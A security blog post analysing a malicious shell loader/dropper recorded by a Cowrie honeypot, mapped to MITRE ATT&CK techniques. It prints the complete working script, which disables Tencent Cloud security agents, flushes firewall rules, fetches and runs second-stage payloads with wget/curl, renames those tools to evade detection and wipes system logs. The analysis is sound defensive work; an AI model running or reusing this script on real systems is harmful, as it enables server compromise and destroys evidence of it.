---
layout: post
title:  "Cowrie Honeypot: Shell Script Loader/Dropper TTP Analysis"
date:   2026-03-08 13:13:55 +0800
categories: Demo
feature-img: "assets/img/post-img/wazuh/day1-home.png"
img: "assets/img/post-img/wazuh/day1-home.png"
tags: Cybersecurity
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
## Introduction:
This article analyzes one of recorded shell script(loader/dropper) execution by using cowrie honeypot. For some privacy policy, I replace the actual IP address of botnet/hacker's machine in the script. At the end, I'll provide MITRE ATT&CK techniques matching this shellscript.

I use Playlog mechanism provided by Cowrie to replay this malicious loader/dropper script. You can find those replayable logs under `var/lib/cowrie/tty/` which Cowrie will make you a favor that there're no duplicated files in there.

<br><br>

## Shell Script

```bash
#!/bin/sh

wdir="/tmp"
for i in "/tmp" "/var/tmp" "/dev/shm" "/usr" "/bin" "/home" "/root"; do
    if [ -w "$i" ]; then
        wdir="$i"
        break
    fi
done
cd "$wdir" || exit 1


systemctl stop YDService >/dev/null 2>&1
systemctl disable YDService >/dev/null 2>&1
systemctl stop tat_agent >/dev/null 2>&1
systemctl disable tat_agent >/dev/null 2>&1


systemctl mask YDService >/dev/null 2>&1
systemctl mask tat_agent >/dev/null 2>&1


systemctl daemon-reload


if command -v chattr >/dev/null 2>&1; then
    chattr -R -i -a /usr/local/qcloud/ >/dev/null 2>&1
fi


pkill -9 YDService >/dev/null 2>&1
pkill -9 YDLive >/dev/null 2>&1


rm -rf /usr/local/qcloud/YunJing >/dev/null 2>&1
rm -rf /usr/local/qcloud/stargate >/dev/null 2>&1
rm -rf /usr/local/qcloud/monitor >/dev/null 2>&1
rm -rf /usr/local/qcloud/tat_agent >/dev/null 2>&1

mkdir -p /usr/local/qcloud/YunJing
mkdir -p /usr/local/qcloud/tat_agent
if command -v chattr >/dev/null 2>&1; then
    chattr +i /usr/local/qcloud/YunJing
    chattr +i /usr/local/qcloud/tat_agent
fi



disable_firewall() {
    systemctl stop firewalld ufw >/dev/null 2>&1
    systemctl disable firewalld ufw >/dev/null 2>&1
    service firewalld stop >/dev/null 2>&1
    service ufw stop >/dev/null 2>&1

    if command -v iptables >/dev/null 2>&1; then
        iptables -P INPUT ACCEPT >/dev/null 2>&1
        iptables -P FORWARD ACCEPT >/dev/null 2>&1
        iptables -P OUTPUT ACCEPT >/dev/null 2>&1
        iptables -F >/dev/null 2>&1
        iptables -X >/dev/null 2>&1
        iptables -t nat -F >/dev/null 2>&1
        iptables -t nat -X >/dev/null 2>&1
    fi
}
disable_firewall

download_and_run() {
    url="$1"
    filename="$2"
    
    if [ -f "./$filename" ] && [ -x "./$filename" ]; then
        setsid "./$filename" >/dev/null 2>&1 &
        return 0
    fi

    dl_bin=""
    dl_args=""

    if command -v good >/dev/null 2>&1; then
        dl_bin="good"
        dl_args="--no-check-certificate -q $url -O $filename"
    elif command -v cool >/dev/null 2>&1; then
        dl_bin="cool"
        dl_args="-skL $url -o $filename"
    elif command -v wget >/dev/null 2>&1; then
        dl_bin="wget"
        dl_args="--no-check-certificate -q $url -O $filename"
    elif command -v curl >/dev/null 2>&1; then
        dl_bin="curl"
        dl_args="-skL $url -o $filename"
    fi

    if [ -z "$dl_bin" ]; then
        apt-get update >/dev/null 2>&1 && apt-get install -y wget curl >/dev/null 2>&1
        yum install -y wget curl >/dev/null 2>&1
        if command -v wget >/dev/null 2>&1; then
            dl_bin="wget"
            dl_args="--no-check-certificate -q $url -O $filename"
        fi
    fi

    if [ -n "$dl_bin" ]; then
        $dl_bin $dl_args >/dev/null 2>&1
        if [ -f "$filename" ]; then
            chmod +x "$filename"
            setsid "./$filename" >/dev/null 2>&1 &
        fi
    fi
}

lock_tools() {
    command -v chattr >/dev/null 2>&1 && chattr -i /usr/bin/wget /usr/bin/curl >/dev/null 2>&1

    w_path=$(which wget 2>/dev/null)
    if [ -n "$w_path" ]; then
        case "$w_path" in
            *good*) ;;
            *) mv "$w_path" "$(dirname "$w_path")/good" >/dev/null 2>&1 ;;
        esac
    fi

    c_path=$(which curl 2>/dev/null)
    if [ -n "$c_path" ]; then
        case "$c_path" in
            *cool*) ;;
            *) mv "$c_path" "$(dirname "$c_path")/cool" >/dev/null 2>&1 ;;
        esac
    fi
}

SERVER_IP="127.0.0.1"
download_and_run "http://$SERVER_IP/vos.txt" "system_update"
download_and_run "http://$SERVER_IP/vox.txt" "network_conf"

lock_tools

cleanup() {
    for log in /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/syslog /var/log/auth.log; do
        if [ -f "$log" ]; then
            echo > "$log" 2>/dev/null
        fi
    done
    rm -f "$0"
}
cleanup

rm -- "$0"
rm -f /root/vos.sh
rm -f /tmp.vos.sh
exit 0
```

## Analysis
### Step 1. Create a working directory

```bash
wdir="/tmp"
for i in "/tmp" "/var/tmp" "/dev/shm" "/usr" "/bin" "/home" "/root"; do
    if [ -w "$i" ]; then
        wdir="$i"; break
    fi
done
cd "$wdir" || exit 1
```

- Find a place to create a working directory which stores shell script and other tools later on.
- `/tmp`, `/var/tmp`, `/dev/shm` is common angle

<br>

### Step 2. Stop & Disable Detection Services

```bash
systemctl stop YDService >/dev/null 2>&1
systemctl disable YDService >/dev/null 2>&1
systemctl stop tat_agent >/dev/null 2>&1
systemctl disable tat_agent >/dev/null 2>&1

systemctl mask YDService >/dev/null 2>&1
systemctl mask tat_agent >/dev/null 2>&1
systemctl daemon-reload
```

- `systemctl stop`, `systemctl disable`, `systemctl mask` these services to `/dev/null` which means if someone wants to start/enable it again, he should unmask these services first (which may increase the time for identifying problems).
- `YDService`, `tat_agent` indicates that this script targets those machines on Tecent cloud service.

<br>

### Step 3. Remove folder's immutable/append-only attribute

```bash
if command -v chattr; then
    chattr -R -i -a /usr/local/qcloud/
fi
```

- `chattr -R -i -a /usr/local/qcloud`: remove immutable and append-only attributes on the folder `/usr/local/qcloud`

<br>

### Step 4. Kill services, Remove folders, Block recovery

```bash
pkill -9 YDService
pkill -9 YDLive

rm -rf /usr/local/qcloud/YunJing
rm -rf /usr/local/qcloud/stargate
rm -rf /usr/local/qcloud/monitor
rm -rf /usr/local/qcloud/tat_agent

mkdir -p /usr/local/qcloud/YunJing
mkdir -p /usr/local/qcloud/tat_agent
if command -v chattr; then
    chattr +i /usr/local/qcloud/YunJing
    chattr +i /usr/local/qcloud/tat_agent
fi
```

- Kill services using SIGKILL
- Remove folders in `/usr/local/qcloud`
- Create folders and set immutable to them for preventing recovery

<br>

### Step 5. Close firewalls

```bash
systemctl stop firewalld ufw
systemctl disable firewalld ufw
service firewalld stop
service ufw stop

iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
```

- Stop `firewalld` and `ufw` firewall related services
- Set iptables all INPUT/FORWARD/OUTPUT policies accepted
- Flush all rules, remove user-defined chain, and remove NAT tables

<br>

### Step 6. Download payload & Execute

```bash
download_and_run() {
    url="$1"
    filename="$2"
    
    if [ -f "./$filename" ] && [ -x "./$filename" ]; then
        setsid "./$filename" >/dev/null 2>&1 &
        return 0
    fi

    dl_bin=""
    dl_args=""

    if command -v good >/dev/null 2>&1; then
        dl_bin="good"
        dl_args="--no-check-certificate -q $url -O $filename"
    elif command -v cool >/dev/null 2>&1; then
        dl_bin="cool"
        dl_args="-skL $url -o $filename"
    elif command -v wget >/dev/null 2>&1; then
        dl_bin="wget"
        dl_args="--no-check-certificate -q $url -O $filename"
    elif command -v curl >/dev/null 2>&1; then
        dl_bin="curl"
        dl_args="-skL $url -o $filename"
    fi

    if [ -z "$dl_bin" ]; then
        apt-get update >/dev/null 2>&1 && apt-get install -y wget curl >/dev/null 2>&1
        yum install -y wget curl >/dev/null 2>&1
        if command -v wget >/dev/null 2>&1; then
            dl_bin="wget"
            dl_args="--no-check-certificate -q $url -O $filename"
        fi
    fi

    if [ -n "$dl_bin" ]; then
        $dl_bin $dl_args >/dev/null 2>&1
        if [ -f "$filename" ]; then
            chmod +x "$filename"
            setsid "./$filename" >/dev/null 2>&1 &
        fi
    fi
}


SERVER_IP="127.0.0.1"
download_and_run "http://$SERVER_IP/vos.txt" "system_update"
download_and_run "http://$SERVER_IP/vox.txt" "network_conf"
```

- If these two files `vos.txt` and `vox.txt` are existed in the target, then execute directly. Otherwise, download them through provided URL and `chmod +x` and run.
- Note that these `good` and `cool` is the strategy that hackers use to avoid detection (rename `wget` and `curl` commands to `good` and `cool`).

<br>

### Step 7. Rename wget & curl

```bash
lock_tools() {
    command -v chattr >/dev/null 2>&1 && chattr -i /usr/bin/wget /usr/bin/curl >/dev/null 2>&1

    w_path=$(which wget 2>/dev/null)
    if [ -n "$w_path" ]; then
        case "$w_path" in
            *good*) ;;
            *) mv "$w_path" "$(dirname "$w_path")/good" >/dev/null 2>&1 ;;
        esac
    fi

    c_path=$(which curl 2>/dev/null)
    if [ -n "$c_path" ]; then
        case "$c_path" in
            *cool*) ;;
            *) mv "$c_path" "$(dirname "$c_path")/cool" >/dev/null 2>&1 ;;
        esac
    fi
}

lock_tools
```

- Rename `wget` and `curl` to avoid detection mechanism.

<br>

### Step 8. Clean footsteps

```bash
cleanup() {
    for log in /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/syslog /var/log/auth.log; do
        if [ -f "$log" ]; then
            echo > "$log" 2>/dev/null
        fi
    done
    rm -f "$0"
}
cleanup

rm -- "$0"
rm -f /root/vos.sh
rm -f /tmp.vos.sh
exit 0
```

- Remove logs in `/var/log/wtmp`, `var/log/btmp`, `/var/log/lastlog`, `/var/log/syslog`, `/var/log/auth.log`.
- Remove this shell script itself and probably other common scripts named `vos.sh` and `tmp.vos.sh`.

<br><br>

## MITRE ATT&CK

**Defense Evasion:**
- Disable or Modify Tools: Stop & Disable YunJing agent and TAT agent
- Impair Defenses: Disable Firewall (firewalld, ufw, iptables)
- Masquerading/Rename system Utilities: Transform wget and curl to good and cool 
- Prevent Recovery: Use `chattr +i` to create immutable folders pretending innocent
- Remove all possible existence: Remove multiple possible logs and the shellscript itself

**Command and Control:**
- Ingress Tool Transfer: Download second-stage payload from hacker's machine/botnet

**Execution:**
- Command and Scripting Interpreter: Run this shellscript on the target machine

**Impact:**
While the script itself is not overtly destructive, it significantly increases risk by impairing defenses—specifically, it stops/masks Tencent Cloud-related agents (e.g., YunJing/YDService and TAT agent), disables firewall protections, and then downloads and launches second-stage payloads. It also attempts to erase authentication and system logs to hinder investigation. This pattern is frequently seen in cloud server compromise scenarios leading to cryptomining (commonly XMR/Monero) or botnet activity.

<br><br>

## Materials
1. [IBM - MITRE ATT&CK](https://www.ibm.com/think/topics/mitre-attack)
2. [Tecent Cloud Service](https://www.tencentcloud.com/)

</div>
</body>
</html>
